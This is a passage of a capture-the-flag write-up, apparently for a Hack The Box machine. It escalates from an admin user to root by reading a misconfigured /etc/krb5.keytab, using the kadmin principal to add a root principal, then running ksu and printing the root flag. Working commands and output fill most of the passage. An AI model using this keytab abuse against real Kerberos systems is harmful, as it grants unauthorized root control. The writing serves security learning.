# Enumeration-
’ll use `find` to identify files in owned by the admin user:

```bash
[admin@srv01 ~]$ find / -user admin -type f 2>/dev/null | grep -Ev "^/sys|^/run|^/proc"
/var/spool/mail/admin
/home/admin/squid_logs.tar.gz.2021-06-27-000701
/home/admin/squid_logs.tar.gz.2021-06-27-000801
[admin@srv01 ~]$ ls -l /var/spool/mail/admin
-rw-rw----. 1 admin mail 0 Dec  9  2020 /var/spool/mail/admin
```

The admin user is in the admin and squid groups:
```bash
[admin@srv01 ~]$ id
uid=1011(admin) gid=1011(admin) groups=1011(admin),23(squid)
```

Checking for files owned by admin-
```bash
[admin@srv01 ~]$ find / -group admin -type f 2>/dev/null | grep -Ev "^/sys|^/run|^/proc"
/etc/krb5.keytab
/usr/local/bin/log_backup.sh
/home/admin/squid_logs.tar.gz.2021-06-27-001001
/home/admin/access.log
/home/admin/cache.log
```

### Keytab Files-

The Keytab file is required on all Kerberos server machines, and is used to authenticate to the KDC. [The documentation](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5/doc/krb5-install/The-Keytab-File.html), after using two sentence two define the file, spends the next two talking about how important it is to protect:

> All Kerberos server machines need a keytab file, called `/etc/krb5.keytab`, to authenticate to the KDC. The keytab file is an encrypted, local, on-disk copy of the host’s key. The keytab file, like the stash file ([Create the Database](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5/doc/krb5-install/Create-the-Database.html)) is a potential point-of-entry for a break-in, and if compromised, would allow unrestricted access to its host. The keytab file should be readable only by root, and should exist only on the machine’s local disk. The file should not be part of any backup of the machine, unless access to the backup data is secured as tightly as access to the machine’s root password itself.


The file itself is binary, but `klist -k` will list the principles in the keytab file-

```bash
[admin@srv01 ~]$ klist -kt
Keytab name: FILE:/etc/krb5.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
```

By default, a `krb5.keytab` file would only have the host principle. But another principle, kadmin, has been added here with both the `admin` and `changepw` privileges. That means that anyone who can read this file can act as kadmin, and that user can run the `kadmin` binary which allows them to administer the Kerberos domain. Running it will drop me to a `kadmin` prompt:

```bash
[admin@srv01 ~]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
Couldn't open log file /var/log/kadmind.log: Permission denied
Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
kadmin:
```

t’s important to specify that I’m getting auth through the keytab file, and that I want to enter as the kadmin principle with `admin` privs.

From within `kadmin`, I can list the users (principles) in the domain:

```bash
kadmin:  list_principals 
K/M@REALCORP.HTB
host/srv01.realcorp.htb@REALCORP.HTB
j.nakazawa@REALCORP.HTB
kadmin/admin@REALCORP.HTB
kadmin/changepw@REALCORP.HTB
kadmin/srv01.realcorp.htb@REALCORP.HTB
kiprop/srv01.realcorp.htb@REALCORP.HTB
krbtgt/REALCORP.HTB@REALCORP.HTB
```

# Root-
I can add root as a principle. When prompted, I enter a password (twice), and then root shows up:

```bash
kadmin:  add_principal root
No policy specified for root@REALCORP.HTB; defaulting to no policy
Enter password for principal "root@REALCORP.HTB": 
Re-enter password for principal "root@REALCORP.HTB": 
Principal "root@REALCORP.HTB" created.
kadmin:  list_principals 
K/M@REALCORP.HTB
host/srv01.realcorp.htb@REALCORP.HTB
j.nakazawa@REALCORP.HTB
kadmin/admin@REALCORP.HTB
kadmin/changepw@REALCORP.HTB
kadmin/srv01.realcorp.htb@REALCORP.HTB
kiprop/srv01.realcorp.htb@REALCORP.HTB
krbtgt/REALCORP.HTB@REALCORP.HTB
root@REALCORP.HTB
kadmin:  exit
```

Now `ksu` will run `su` using Kerberos, so I’ll enter the password I just created for root:

```bash
[admin@srv01 ~]$ ksu
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@REALCORP.HTB: : 
Authenticated root@REALCORP.HTB
Account root: authorization for root@REALCORP.HTB successful
Changing uid to root (0)
[root@srv01 admin]# ls -la
total 856
drwxr-x---. 3 admin admin    125 Jun 27 00:26 .
drwxr-xr-x. 4 root  root      37 Nov  3  2020 ..
lrwxrwxrwx. 1 root  root       9 Dec  9  2020 .bash_history -> /dev/null
-rw-r--r--. 1 admin admin 434581 Jun 27 00:25 squid_logs.tar.gz.2021-06-27-002501
-rw-r--r--. 1 admin admin 434581 Jun 27 00:26 squid_logs.tar.gz.2021-06-27-002601
drwx------. 2 admin admin      6 Dec 25  2020 .ssh
[root@srv01 admin]# cd /root
[root@srv01 ~]# ls
anaconda-ks.cfg  root.txt
[root@srv01 ~]# cat root.txt 
1af37803e2b40f60fb236ceef3ac86ba
```